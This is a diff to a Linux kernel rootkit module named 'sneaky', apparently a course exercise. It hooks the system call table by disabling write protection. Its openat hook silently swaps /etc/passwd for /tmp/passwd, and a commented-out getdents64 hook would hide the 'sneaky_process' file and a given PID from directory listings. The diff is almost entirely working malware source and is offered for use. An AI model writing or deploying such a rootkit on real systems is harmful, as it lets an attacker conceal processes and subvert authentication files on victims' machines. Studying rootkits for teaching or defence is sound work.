@@ -10,14 +10,18 @@
 #include <asm/cacheflush.h>
 
 #define PREFIX "sneaky_process"
-static int pid = 0;
+
+static int pid;
 module_param(pid, int, 0);
-MODULE_PARM_DESC(pid, "sneaky_pid");
-struct linux_dirent
+char *sneaky_pid = NULL;
+module_param(sneaky_pid, charp, 0);
+struct linux_dirent64
 {
-  u64 d_ino;
-  s64 d_off;
-  unsigned short d_reclen;
+  unsigned long d_ino;     // inode number
+  off_t d_off;             // offset to next structure
+  unsigned short d_reclen; // size of this strucutre
+  unsigned char
+      d_type; // type of this structure e.g. normal file, socket, directory, ...
   char d_name[];
 };
 
@@ -54,14 +58,41 @@ asmlinkage int (*original_openat)(struct pt_regs *);
 // Define your new sneaky version of the 'openat' syscall
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
-  unsigned long path_addr = regs->si;
-  char *pathname = (char *)path_addr;
+  char *pathname = (char *)regs->si;
   if (strcmp(pathname, "/etc/passwd") == 0)
   {
     copy_to_user(pathname, "/tmp/passwd", strlen("/tmp/passwd") + 1);
+    printk(KERN_INFO "open at attack!");
   }
   return (*original_openat)(regs);
 }
+
+// asmlinkage int (*original_getdents64)(struct pt_regs *regs);
+
+// asmlinkage int sneaky_getdents64(struct pt_regs *regs)
+// {
+//   unsigned long entryDirent = regs->si;
+//   int nread = (*original_getdents64)(regs), off = 0;
+//   printk(KERN_INFO "get sneaky getdents64 with process id %s", sneaky_pid);
+
+//   if (nread <= 0) {
+//     return 0;  // == 0 means nothing to read, and < 0 means error
+//   }
+
+//   for (off = 0; off < nread;) {
+//     struct linux_dirent64 * curDirent = (struct linux_dirent64 *)(entryDirent + off);
+//     if (strcmp(curDirent->d_name, "sneaky_process") == 0 ||
+//         strcmp(curDirent->d_name, sneaky_pid) == 0) {
+//       void * nextDirent = (void *)curDirent + curDirent->d_reclen;
+//       int remaining_size = nread - (off + curDirent->d_reclen);
+//       memmove(curDirent, nextDirent, remaining_size);
+//       nread -= curDirent->d_reclen;
+//     }
+
+//     off += curDirent->d_reclen;
+//   }
+//   return nread;
+// }
 
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
@@ -77,11 +108,13 @@ static int initialize_sneaky_module(void)
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
   original_openat = (void *)sys_call_table[__NR_openat];
+  //original_getdents64 = (void *)sys_call_table[__NR_getdents64];
+
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
 
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
-
+  //sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
   // You need to replace other system calls you need to hack here
 
   // Turn write protection mode back on for sys_call_table
